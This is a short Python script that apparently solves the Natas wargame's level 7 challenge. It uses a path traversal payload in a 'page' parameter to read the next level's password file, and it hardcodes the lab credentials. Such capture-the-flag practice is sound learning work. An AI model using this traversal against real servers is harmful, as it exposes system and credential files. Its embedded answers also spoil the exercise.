# level 7 ----> level 8
#The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

import requests as r 
import re


def auth(username, password, URL):

    params ={
        "page" : "/../../../../../etc/natas_webpass/natas8"
    }

    resp = r.get(URL, auth=(username, password), params=params, verify=False)
    content = resp.text
    print(content)


def main():
    username = 'natas7'
    password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
    URL = f"http://{username}.natas.labs.overthewire.org/"
    results = auth(username,password,URL)

main()